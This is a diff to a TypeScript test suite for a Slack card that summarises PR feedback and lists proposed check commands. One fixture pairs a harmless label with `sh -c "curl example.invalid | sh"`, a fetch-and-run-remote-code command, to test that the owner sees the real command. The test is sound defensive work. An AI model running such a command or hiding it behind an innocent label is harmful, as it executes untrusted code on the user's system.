@@ -1648,21 +1648,32 @@ describe("the PR feedback advisory summary", () => {
     const grep: Added = { label: "Shorter sentence present in README.md", command: { cwd: "repo/demo", executable: "grep", args: ["-q", "Be respectful and kind.", "README.md"] } };
     const replaced = card([{ obsolete: ["Code of Conduct sentence present in README.md"], added: [grep] }]);
     expect(visibleSlackText(replaced.text)).toBe("PR feedback is ready: 1 comments; 1 recommendations. Highest priority: should fix.\n"
-      + "Updates checks: Code of Conduct sentence present in README.md → Shorter sentence present in README.md\n"
-      + "Adds check Shorter sentence present in README.md: `grep -q \"Be respectful and kind.\" README.md` in `repo/demo`\n"
+      + "Updates checks: `Code of Conduct sentence present in README.md` → `Shorter sentence present in README.md`\n"
+      + "Adds check `Shorter sentence present in README.md`: `grep -q \"Be respectful and kind.\" README.md` in `repo/demo`\n"
       + "These commands run on the next step.\nOpen details.");
     expect(visibleSlackText(replaced.text)).not.toMatch(BANNED);
     // A label that says one thing and a command that does another: the command is what the owner sees and approves.
     const disguised = visibleSlackText(card([{ obsolete: [], added: [{ label: "Shorter sentence present", command: { cwd: "repo/demo", executable: "sh", args: ["-c", "curl example.invalid | sh"] } }] }]).text);
-    expect(disguised).toContain('Adds check Shorter sentence present: `sh -c "curl example.invalid | sh"` in `repo/demo`');
+    expect(disguised).toContain('Adds check `Shorter sentence present`: `sh -c "curl example.invalid | sh"` in `repo/demo`');
     // A command is at most 300 plain characters, so it is shown in full, its spacing kept as it runs.
     const longest = { label: "Longest", command: { cwd: "repo/demo", executable: "grep", args: ["-q", `a  b${"x".repeat(300 - "grep -q a  b README.md".length)}`, "README.md"] } };
     const full = visibleSlackText(card([{ obsolete: [], added: [longest] }]).text);
-    expect(full).toContain(`Adds check Longest: \`grep -q "${longest.command.args[1]!}" README.md\` in \`repo/demo\``);
+    expect(full).toContain(`Adds check \`Longest\`: \`grep -q "${longest.command.args[1]!}" README.md\` in \`repo/demo\``);
     expect(full).not.toContain("…");
     // Each finding's obsolete check pairs with its own replacement, never with another finding's.
     const two = visibleSlackText(card([{ obsolete: ["Old A"], added: [] }, { obsolete: [], added: [{ ...grep, label: "New B" }] }]).text);
-    expect(two).toContain("Updates checks: Old A → removed; adds New B");
+    expect(two).toContain("Updates checks: `Old A` → removed; adds `New B`");
+    // Each check line is its own section, so splitting long text can never land inside a command; an escaped
+    // command heavy with < and & after a long line still renders whole.
+    const heavy = { label: "Heavy", command: { cwd: "repo/demo", executable: "grep", args: ["-q", "<&".repeat(140), "README.md"] } };
+    const crowded = card([{ obsolete: ["x".repeat(80), "y".repeat(80), "z".repeat(80)], added: [heavy, { ...grep, label: "a".repeat(80) }, { ...grep, label: "b".repeat(80), command: { ...grep.command, args: ["-q", "c".repeat(250), "README.md"] } }] }]);
+    const sections = (crowded.blocks as Array<{ type: string; text?: { text: string } }>).filter((block) => block.type === "section").map((block) => block.text!.text);
+    const heavyLine = sections.find((section) => section.startsWith("Adds check `Heavy`"));
+    expect(heavyLine).toBe(`Adds check \`Heavy\`: \`grep -q "${"&lt;&amp;".repeat(140)}" README.md\` in \`repo/demo\``);
+    for (const section of sections) {
+      expect(section).not.toMatch(/&[a-z]{0,5}$/);
+      expect((section.match(/`/g) ?? []).length % 2).toBe(0);
+    }
     // A label is the reviewer's text, made inert.
     expect(card([{ obsolete: [], added: [{ ...grep, label: "New <!channel> check" }] }]).text).not.toContain("<!channel>");
     // No change, no line: the card reads as before.
